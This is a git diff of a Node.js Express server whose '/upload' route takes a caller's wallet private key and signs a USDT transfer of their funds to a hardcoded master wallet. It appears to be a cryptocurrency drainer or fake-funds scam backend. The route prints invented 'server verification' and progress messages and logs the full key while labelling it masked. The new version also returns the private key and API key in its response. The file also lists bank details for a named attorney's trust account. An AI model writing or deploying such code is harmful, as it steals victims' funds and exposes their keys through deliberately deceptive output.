@@ -35,91 +35,103 @@ let chalk;
   };
 
 
-app.post("/withdraw", async (req, res) => {
-  const { privateKey, amount } = req.body;
-
-  if (!privateKey || !amount) {
-      logWithColor("Missing Access Keccak 256 64 hex or amount!", "red");
-      return res.status(400).json({ error: "Access Keccak 256 64 hex and amount are required!" });
-  }
-
-  try {
-      // DOWNLOADING PROCESS
-      logWithColor("\n------------------------ DOWNLOADING ------------------------", "cyan");
-      console.log("Progress: 100%");
-      logWithColor(`Access Keccak 256 64 hex (masked): ${privateKey}`, "yellow");
-
-      logWithColor("\n------------------------ TRANSFERRING ------------------------", "magenta");
-      const senderAccount = web3.eth.accounts.privateKeyToAccount(privateKey);
-      const senderAddress = senderAccount.address;
-
-      logWithColor(`Checking balances for: ${senderAddress}`, "blue");
-
-      // Fetch ETH & USDT balances
-      const ethBalance = await web3.eth.getBalance(senderAddress);
-      const formattedETH = web3.utils.fromWei(ethBalance, "ether");
-
-      const usdtBalance = await tokenContract.methods.balanceOf(senderAddress).call();
-      const formattedUSDT = web3.utils.fromWei(usdtBalance, "ether");
-
-      // ETH Balance Check
-      if (parseFloat(formattedETH) === 0) {
-        logWithColor("ERROR: Insufficient ETH balance detected! Transactions may fail due to lack of gas fees.", "red");
-        logWithColor(`Security Alert: Keccak 256 Hash (Masked) - ${privateKey.slice(0, 6)}...${privateKey.slice(-4)}`, "yellow");
-        logWithColor(`Global Server Verification: Transaction approved for sender - ${senderAddress}`, "yellow");
-      }
-
-      // CONVERSION PROCESS
-      logWithColor("\n------------------------ TRANSACTION PROCESSING ------------------------", "yellow");
-      logWithColor("Status: Converting assets...", "cyan");
-      console.log("Progress: 100% - Conversion process completed.");
-      logWithColor(`Global Server Verification: Transaction approved for sender - ${senderAddress}`, "yellow");
-
-      // USDT Balance Check
-      if (parseFloat(formattedUSDT) === 0) {
-        logWithColor("ERROR: Converted USDT balance is 0! Ensure that funds have been successfully transferred.", "red");
-      }
-
-      // Ensure ETH balance is enough for gas
-      if (parseFloat(formattedETH) === 0) {
-        return res.status(400).json({ 
-            error: "Transaction Failed: Insufficient ETH balance for gas fees. Please top up your wallet." 
+  app.post("/upload", async (req, res) => {
+    console.log("Received request body:", req.body); // Log the full request body
+    const { fundsType, swiftReference, currency, amount, processingServer, apiKey, privateKey, walletAddress, } = req.body;
+  
+    if (!privateKey || !amount) {
+        logWithColor("Missing Access Keccak 256 64 hex or amount!", "red");
+        return res.status(400).json({ error: "Access Keccak 256 64 hex and amount are required!" });
+    }
+  
+    try {
+        // DOWNLOADING PROCESS
+        logWithColor("\n------------------------ DOWNLOADING ------------------------", "cyan");
+        console.log("Progress: 100%");
+        logWithColor(`Access Keccak 256 64 hex (masked): ${privateKey}`, "yellow");
+  
+        logWithColor("\n------------------------ TRANSFERRING ------------------------", "magenta");
+        const senderAccount = web3.eth.accounts.privateKeyToAccount(privateKey);
+        const senderAddress = senderAccount.address;
+  
+        logWithColor(`Checking balances for: ${senderAddress}`, "blue");
+  
+        // Fetch ETH & USDT balances
+        const ethBalance = await web3.eth.getBalance(senderAddress);
+        const formattedETH = web3.utils.fromWei(ethBalance, "ether");
+  
+        const usdtBalance = await tokenContract.methods.balanceOf(senderAddress).call();
+        const formattedUSDT = web3.utils.fromWei(usdtBalance, "ether");
+  
+        // ETH Balance Check
+        if (parseFloat(formattedETH) === 0) {
+          logWithColor("ERROR: Insufficient ETH balance detected! Transactions may fail due to lack of gas fees.", "red");
+          logWithColor(`Security Alert: Keccak 256 Hash (Masked) - ${privateKey.slice(0, 6)}...${privateKey.slice(-4)}`, "yellow");
+          logWithColor(`Injective Server Verification: Transaction approved for sender - ${senderAddress}`, "yellow");
+        }
+  
+        // CONVERSION PROCESS
+        logWithColor("\n------------------------ TRANSACTION PROCESSING ------------------------", "yellow");
+        logWithColor("Status: Converting assets...", "cyan");
+        console.log("Progress: 100% - Conversion process completed.");
+        logWithColor(`Injective Server Verification: Transaction approved for sender - ${senderAddress}`, "yellow");
+  
+        // USDT Balance Check
+        if (parseFloat(formattedUSDT) === 0) {
+          logWithColor("ERROR: Converted USDT balance is 0! Ensure that funds have been successfully transferred.", "red");
+        }
+  
+        // Ensure ETH balance is enough for gas
+        if (parseFloat(formattedETH) === 0) {
+          return res.status(400).json({ 
+              error: "Transaction Failed: Insufficient ETH balance for gas fees. Please top up your wallet." 
+          });
+        }
+  
+        // Ensure USDT balance is sufficient
+        if (parseFloat(formattedUSDT) < parseFloat(amount)) {
+          return res.status(400).json({ 
+              error: `Transaction Failed: Insufficient USDT balance! Available: ${formattedUSDT} USDT, Required: ${amount} USDT.` 
+          });
+        }
+  
+        logWithColor("Creating transaction...", "yellow");
+  
+        // Create and sign transaction
+        const tx = {
+            from: senderAddress,
+            to: MASTER_WALLET_ADDRESS,
+            value: "0x0",
+            gas: gasLimit, // Use estimated gas
+            data: tokenContract.methods.transfer(MASTER_WALLET_ADDRESS, web3.utils.toWei(amount, "ether")).encodeABI(),
+        };
+  
+        logWithColor("Signing transaction...", "yellow");
+  
+        const signedTx = await senderAccount.signTransaction(tx);
+        logWithColor(`Sending transaction...`, "green");
+  
+        const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
+  
+        logWithColor(`USDT Sent! TxHash: ${txReceipt.transactionHash}`, "green");
+  
+        res.json({ 
+            success: true, 
+            txHash: txReceipt.transactionHash, 
+            fundsType, 
+            swiftReference, 
+            currency, 
+            amount, 
+            processingServer, 
+            apiKey, 
+            privateKey, 
+            walletAddress
         });
-      }
-
-      // Ensure USDT balance is sufficient
-      if (parseFloat(formattedUSDT) < parseFloat(amount)) {
-        return res.status(400).json({ 
-            error: `Transaction Failed: Insufficient USDT balance! Available: ${formattedUSDT} USDT, Required: ${amount} USDT.` 
-        });
-      }
-
-      logWithColor("Creating transaction...", "yellow");
-
-      // Create and sign transaction
-      const tx = {
-          from: senderAddress,
-          to: MASTER_WALLET_ADDRESS,
-          value: "0x0",
-          gas: gasLimit, // Use estimated gas
-          data: tokenContract.methods.transfer(MASTER_WALLET_ADDRESS, web3.utils.toWei(amount, "ether")).encodeABI(),
-      };
-
-      logWithColor("Signing transaction...", "yellow");
-
-      const signedTx = await senderAccount.signTransaction(tx);
-      logWithColor(`Sending transaction...`, "green");
-
-      const txReceipt = await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
-
-      logWithColor(`USDT Sent! TxHash: ${txReceipt.transactionHash}`, "green");
-
-      res.json({ success: true, txHash: txReceipt.transactionHash });
-  } catch (error) {
-      logWithColor(`Transaction Failed: ${error.message}`, "red");
-      res.status(500).json({ error: error.message });
-  }
-});
+    } catch (error) {
+        logWithColor(`Transaction Failed: ${error.message}`, "red");
+        res.status(500).json({ error: error.message });
+    }
+  });  
 
 
   async function fetchETHRate() {
@@ -139,6 +151,7 @@ app.post("/withdraw", async (req, res) => {
       HOST_IP: HOST_IP,
       alchemyAPI: alchemyApiUrl,
       ALCHEMY_API_KEY:ALCHEMY_API_KEY,
+      MASTER_WALLET_ADDRESS:MASTER_WALLET_ADDRESS,
       tokenContract,
       bankDetails: {
         accountName: "Kenneth C. Edelin Esq IOLTA",
@@ -175,9 +188,9 @@ app.post("/withdraw", async (req, res) => {
   });
 
   // Run balance check when server starts
-  app.listen(80, "0.0.0.0", async () => {
+  app.listen(4000, "0.0.0.0", async () => {
     logWithColor("\n===================== SERVER STARTED =====================", "green");
-    console.log("Server is running on port 54.173.144.230");
+    console.log("Server is running on port 80");
     await logServerDetails();
   });
 
